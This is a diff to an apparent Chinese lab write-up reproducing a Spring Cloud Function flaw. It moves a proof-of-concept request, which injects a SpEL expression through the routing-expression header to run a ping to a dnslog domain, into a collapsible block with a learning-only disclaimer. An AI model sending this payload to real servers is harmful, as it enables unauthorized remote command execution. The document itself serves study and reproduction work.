@@ -34,12 +34,15 @@ Spring Cloud Function
 
 发送 POC
 
-```
-POST /functionRouter HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /functionRouter HTTP/1.1
 Host: 192.168.1.27:9000
-spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 dxytoy.dnslog.cn")
-Content-Length: 1
-```
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().&#101;xec("ping -c 1 dxytoy.dnslog.cn")
+Content-Length: 1</code></pre>
+
+</details>
 
 接收到请求
 
